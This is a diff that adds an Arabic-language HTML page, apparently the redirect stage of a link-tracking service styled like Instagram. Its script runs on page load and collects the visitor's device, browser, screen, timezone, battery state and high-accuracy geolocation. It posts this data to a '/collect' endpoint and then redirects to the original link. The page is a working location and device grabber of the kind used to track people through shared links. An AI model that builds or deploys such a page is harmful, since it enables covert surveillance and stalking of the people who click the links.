@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحويل...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .loader {
+            text-align: center;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        .logo {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0095f6, #005bb5);
+            border-radius: 50%;
+            color: #ffffff;
+            font-size: 34px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+        }
+        p { color: #262626; font-size: 16px; margin: 8px 0; }
+        .sub { color: #8e8e8e; font-size: 13px; }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 13px;
+        }
+        .info-item {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .info-item .label {
+            color: #8e8e8e;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+        .info-item .value {
+            color: #262626;
+            font-weight: 600;
+            margin-top: 3px;
+            font-size: 14px;
+        }
+        .battery {
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        .battery-level {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .battery-icon {
+            width: 40px;
+            height: 20px;
+            border: 2px solid #333;
+            border-radius: 4px;
+            position: relative;
+            padding: 2px;
+        }
+        .battery-icon::after {
+            content: '';
+            position: absolute;
+            right: -6px;
+            top: 4px;
+            width: 4px;
+            height: 8px;
+            background: #333;
+            border-radius: 0 2px 2px 0;
+        }
+        .battery-fill {
+            height: 100%;
+            background: #4caf50;
+            border-radius: 2px;
+            transition: width 0.5s;
+        }
+        .battery-text {
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .charging {
+            color: #4caf50;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #0095f6;
+            width: 0%;
+            animation: progress 2s ease-in-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .maps-link {
+            display: inline-block;
+            margin: 5px;
+            padding: 8px 16px;
+            background: #0095f6;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-size: 13px;
+            transition: background 0.3s;
+        }
+        .maps-link:hover { background: #0077d4; }
+        .maps-link.google-earth { background: #4285f4; }
+        .maps-link.google-earth:hover { background: #3367d6; }
+        .location-info {
+            background: #e3f2fd;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        .status-text {
+            color: #0095f6;
+            font-weight: 600;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="logo">📍</div>
+        <div class="spinner"></div>
+        <p>جاري جمع بيانات جهازك...</p>
+        <p class="sub">سيتم تحويلك بعد قليل</p>
+        
+        <div id="deviceInfo" style="display:none;">
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="label">📱 الجهاز</div>
+                    <div class="value" id="deviceName">...</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">🌐 المتصفح</div>
+                    <div class="value" id="browserName">...</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">🖥️ الشاشة</div>
+                    <div class="value" id="screenSize">...</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">⏰ التوقيت</div>
+                    <div class="value" id="timezone">...</div>
+                </div>
+            </div>
+            
+            <div class="battery" id="batteryInfo">
+                <div class="battery-level">
+                    <div class="battery-icon">
+                        <div class="battery-fill" id="batteryFill" style="width: 0%;"></div>
+                    </div>
+                    <span class="battery-text" id="batteryPercent">--%</span>
+                </div>
+                <div class="charging" id="chargingStatus">⏳ جاري القراءة...</div>
+            </div>
+            
+            <div class="location-info" id="locationInfo">
+                <div style="font-weight:600; margin-bottom:8px;">📍 الموقع الجغرافي</div>
+                <div id="locationStatus" class="status-text">جاري تحديد الموقع...</div>
+                <div id="locationCoords" style="font-size:13px; color:#555; margin:8px 0;"></div>
+                <div id="locationLinks" style="margin-top:10px;">
+                    <a href="#" target="_blank" class="maps-link" id="googleMapsLink">🗺️ خرائط جوجل</a>
+                    <a href="#" target="_blank" class="maps-link google-earth" id="googleEarthLink">🌍 جوجل إيرث</a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+    </div>
+
+    <script>
+        const code = window.location.pathname.split('/')[1];
+        
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        levelPercent: Math.round(battery.level * 100) + '%'
+                    };
+                }
+            } catch(e) {}
+            return { level: 'غير متاح', charging: false, levelPercent: 'غير متاح' };
+        }
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ available: false, error: 'المتصفح لا يدعم تحديد الموقع' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            available: true,
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        let msg = 'مرفوض من المستخدم';
+                        if (error.code === 1) msg = '❌ تم رفض الوصول للموقع';
+                        else if (error.code === 2) msg = '❌ الموقع غير متاح حالياً';
+                        else if (error.code === 3) msg = '⏱️ انتهت مهلة تحديد الموقع';
+                        resolve({ available: false, error: msg });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'جهاز غير معروف';
+            if (/iPhone|iPad|iPod/i.test(ua)) device = '📱 Apple iOS';
+            else if (/Android/i.test(ua)) device = '📱 Android';
+            else if (/Windows/i.test(ua)) device = '💻 Windows';
+            else if (/Macintosh/i.test(ua)) device = '💻 macOS';
+            else if (/Linux/i.test(ua)) device = '💻 Linux';
+            
+            let browser = 'متصفح غير معروف';
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = '🌐 Chrome';
+            else if (/Firefox/i.test(ua)) browser = '🌐 Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = '🌐 Safari';
+            else if (/Edg/i.test(ua)) browser = '🌐 Edge';
+            
+            return { device, browser, screen: `${window.screen.width}x${window.screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, userAgent: ua };
+        }
+
+        async function collectAndRedirect() {
+            document.getElementById('deviceInfo').style.display = 'block';
+            
+            const deviceInfo = getDeviceInfo();
+            document.getElementById('deviceName').textContent = deviceInfo.device;
+            document.getElementById('browserName').textContent = deviceInfo.browser;
+            document.getElementById('screenSize').textContent = deviceInfo.screen;
+            document.getElementById('timezone').textContent = deviceInfo.timezone;
+            
+            const batteryInfo = await getBatteryInfo();
+            if (batteryInfo.level !== 'غير متاح') {
+                document.getElementById('batteryFill').style.width = batteryInfo.level + '%';
+                document.getElementById('batteryPercent').textContent = batteryInfo.level + '%';
+                const fill = document.getElementById('batteryFill');
+                if (batteryInfo.level < 20) fill.style.background = '#f44336';
+                else if (batteryInfo.level < 50) fill.style.background = '#ff9800';
+                else fill.style.background = '#4caf50';
+                document.getElementById('chargingStatus').textContent = batteryInfo.charging ? '⚡ جاري الشحن...' : '🔋 يعمل على البطارية';
+            } else {
+                document.getElementById('batteryPercent').textContent = '❌ غير متاح';
+                document.getElementById('chargingStatus').textContent = '⚠️ لا يمكن قراءة حالة البطارية';
+            }
+            
+            const location = await getLocation();
+            if (location.available) {
+                const { lat, lng, accuracy } = location;
+                document.getElementById('locationStatus').textContent = '✅ تم تحديد الموقع';
+                document.getElementById('locationStatus').style.color = '#4caf50';
+                document.getElementById('locationCoords').textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)} (دقة: ${Math.round(accuracy)} متر)`;
+                document.getElementById('googleMapsLink').href = `https://www.google.com/maps?q=${lat},${lng}`;
+                document.getElementById('googleEarthLink').href = `https://earth.google.com/web/@${lat},${lng},0a,1000d`;
+            } else {
+                document.getElementById('locationStatus').textContent = location.error;
+                document.getElementById('locationStatus').style.color = '#f44336';
+                document.getElementById('locationCoords').textContent = '⚠️ لم يتم تحديد الموقع';
+                document.getElementById('googleMapsLink').style.display = 'none';
+                document.getElementById('googleEarthLink').style.display = 'none';
+            }
+            
+            const data = {
+                code: code,
+                user_agent: deviceInfo.userAgent,
+                device: deviceInfo.device,
+                browser: deviceInfo.browser,
+                screen: deviceInfo.screen,
+                timezone: deviceInfo.timezone,
+                battery: batteryInfo,
+                location: location.available
+                    ? { available: true, lat: location.lat, lng: location.lng, accuracy: location.accuracy }
+                    : { available: false, error: location.error },
+                timestamp: new Date().toISOString()
+            };
+            
+            try {
+                await fetch(`/collect/${code}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+            
+            try {
+                const response = await fetch(`/link/${code}`);
+                const linkData = await response.json();
+                setTimeout(() => { window.location.href = linkData.original_url || 'https://www.instagram.com/'; }, 2000);
+            } catch(e) {
+                setTimeout(() => { window.location.href = 'https://www.instagram.com/'; }, 2000);
+            }
+        }
+
+        window.addEventListener('load', collectAndRedirect);
+    </script>
+</body>
+</html>
